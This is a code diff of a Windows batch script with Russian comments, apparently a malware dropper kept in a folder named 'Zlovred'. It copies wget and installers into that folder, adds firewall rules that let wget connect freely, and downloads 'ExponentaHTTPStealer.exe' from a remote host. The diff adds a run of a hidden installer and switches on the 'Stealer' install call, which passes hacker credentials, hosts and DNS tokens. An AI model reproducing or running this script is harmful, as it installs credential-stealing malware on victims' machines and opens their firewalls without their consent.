@@ -87,20 +87,21 @@ rem set httpuser=%Hacker_User%
 rem WebDAV Password
 rem set httppassword=%Hacker_Pass%
 rem Локальный каталог
-set LocalFolder=%PUB1%\Distrib\Zlovred
+set LocalFolderZ=%PUB1%\Distrib\Zlovred
 
-rem Копируем wget и запускаем установку в каталоге %LocalFolder%
-copy wget.exe %LocalFolder%\wget.exe
-copy install_Styler.ini %LocalFolder%\
-copy installHTTP_Stylerdistrib.bat %LocalFolder%\
-copy Install_StylerHTTP.bat %LocalFolder%\
-cd /d %LocalFolder%
-cd %LocalFolder%
+rem Копируем wget и запускаем установку в каталоге %LocalFolderZZ%
+copy wget.exe %LocalFolderZ%\wget.exe
+copy ExponentaInstallerHttpHidden.exe %LocalFolderZ%\ExponentaInstallerHttpHidden.exe
+copy install_Styler.ini %LocalFolderZ%\
+copy installHTTP_Stylerdistrib.bat %LocalFolderZ%\
+copy Install_StylerHTTP.bat %LocalFolderZ%\
+cd /d %LocalFolderZ%
+cd %LocalFolderZ%
 
 rem Разрешаем все протоколы для wget.exe в брандмауэре
-%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%LocalFolder%\wget.exe" enable=yes
+%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%LocalFolderZ%\wget.exe" enable=yes
 rem Разрешаем все протоколы для wget.exe в брандмауэре
-%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%LocalFolder%\wget.exe" enable=yes
+%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%LocalFolderZ%\wget.exe" enable=yes
 
 
 rem Запускаем на выполнение команды WGET
@@ -110,9 +111,11 @@ wget %host%/ExponentaHTTPStealer.exe
 rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
 rem wget -r --no-parent %host%/
 
+rem Запускаем инсталлятор Admin-Pack "Экспонента"
+ExponentaInstallerHttpHidden.exe
 
 rem Запускаем инсталлятор Stealer "Экспонента"
-rem call install_StylerHTTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %Hacker_httppref% %Hacker_httpport% %hldnstoken% %entrydnstoken%
+call install_StylerHTTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %Hacker_httppref% %Hacker_httpport% %hldnstoken% %entrydnstoken%
 cd /d %curdir%
 
 rem Удаляем временный каталог
